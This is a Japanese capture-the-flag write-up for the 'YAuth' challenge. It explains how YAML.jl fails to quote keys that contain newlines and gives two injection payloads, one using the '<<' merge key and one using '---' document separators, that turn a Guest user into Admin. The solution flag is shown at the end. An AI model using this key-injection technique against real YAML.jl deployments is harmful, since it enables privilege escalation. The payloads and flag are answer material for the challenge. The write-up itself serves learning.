# YAuth

[English version is here](./README.md)

## 説明

いったりきたり

## Writeup

### 概要

```julia
data = JSON.parse(body, Dict{String, Any})
data["username"] = "Guest"

yaml = YAML.write(data)
result = YAML.load(yaml, yaml_constructors)

if result["username"] == "Admin"
    result["flag"] = flag
end

println(JSON.json(result))
```

直感的には、`YAML.load(YAML.write(data))` と `data` は同じデータを表すはずです。しかし、この問題では、シリアライズしてデシリアライズした際に `data["username"]` が `Guest` から `Admin` に変化するような入力を生成する必要があります。

### 解法

バグは、YAML.jlがシリアライズ時にキーをクォートする必要があるかどうかを判定するロジックにあります（[ここ](https://github.com/JuliaData/YAML.jl/blob/f43e80285d127f1a02d4508e4ba6858534c45575/src/writer.jl#L103) を参照）：

```julia
function string_key_needs_quoting(s::AbstractString)
    isempty(s) && return true
    occursin('#', s) && return true
    occursin(':', s) && return true
    occursin(' ', s) && return true
    first(s) in "{}[]&*?|-+.<>=!%@:`,\"'" && return true
    isdigit(first(s)) && return true
    s in ("true", "True", "TRUE", "false", "False", "FALSE") && return true
    return false
end
```

見ての通り、改行コードのチェックが行われていません。つまり、以下のようなオブジェクトをシリアライズした場合：

```json
{
    "\nfoo": "bar"
}
```

以下のように書き出されます：

```yaml

foo: bar
```

そして、これがデシリアライズされると、以下のようになります：

```json
{
    "foo": "bar"
}
```

したがって、`{"\nusername": "Admin"}` を入力すると、デシリアライズ後に `{"username": "Admin"}` に変換されます。次のステップは `strict_unique_keys` のチェックを回避することです。これには、想定された2つのアプローチがあります。

### 解法 1

[このコード](https://github.com/JuliaData/YAML.jl/blob/f43e80285d127f1a02d4508e4ba6858534c45575/src/constructor.jl#L205) によると、オブジェクトが `<<` を使ってマージされる場合、 `strict_unique_keys` はチェックされません。そのため、`{"\n<<": {"x": "y"}, "\nusername": "Admin"}` は `strict_unique_keys` チェックを回避できます。YAML.jl はキーが重複している場合、後の方の値を優先するため、`\nusername` が `username` よりも後に来るようにする必要があります。これは試行錯誤によって調整でき、`\nusername\r` のようなキーが機能します。

```
{"\n<<": {"x": "y"}, "\nusername\r": "Admin"}
```

### 解法 2

YAML では、`---` を使用して1つのファイル内に複数のドキュメントを分割して記述できます。しかし、`YAML.load` は最初のドキュメントのみをパースします。（複数のドキュメントをパースするには `YAML.load_all` を使用する必要があります。）この事実を利用して、2番目のドキュメントに `"username": "Guest"` を出現させることができます。

```
{"\n\n---\nusername": "Admin", "\n\n---\nx": "a"}
```
## Flag
`Alpaca{Y4ML_is_to0_compl3x_7o_implemen7_pr0perly_:(}`
